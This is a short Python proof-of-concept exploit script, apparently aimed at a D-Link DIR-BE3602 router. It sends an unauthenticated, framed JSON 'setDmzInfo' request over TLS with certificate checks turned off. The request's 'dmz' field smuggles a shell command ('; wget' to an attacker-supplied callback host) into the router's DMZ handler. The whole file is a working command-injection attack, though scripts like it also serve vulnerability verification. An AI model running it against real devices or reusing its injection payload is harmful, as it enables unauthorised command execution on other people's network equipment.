#!/usr/bin/env python3
import argparse
import json
import socket
import ssl
import struct


def main():
    parser = argparse.ArgumentParser(description='Unauthenticated command injection in framed JSON DMZ handler')
    parser.add_argument('--target', default='192.168.210.1')
    parser.add_argument('--port', type=int, default=18169)
    parser.add_argument('--callback', required=True)
    parser.add_argument('--nonce', default='DLINK-DIR-BE3602-V045')
    args = parser.parse_args()
    body = {'method': 'setDmzInfo', 'seq': '1', 'dmz': f"';wget http://{args.callback}/{args.nonce};#"}
    raw_body = json.dumps(body, separators=(',', ':')).encode()
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    with socket.create_connection((args.target, args.port), timeout=15) as raw:
        with context.wrap_socket(raw, server_hostname=args.target) as stream:
            stream.sendall(struct.pack('>II', 0, len(raw_body)) + raw_body)
            stream.settimeout(15)
            response = stream.recv(65536)
    print(json.dumps({'request': body, 'response_hex': response.hex(),
                      'expected_callback_path': '/' + args.nonce}, indent=2))


if __name__ == '__main__':
    main()
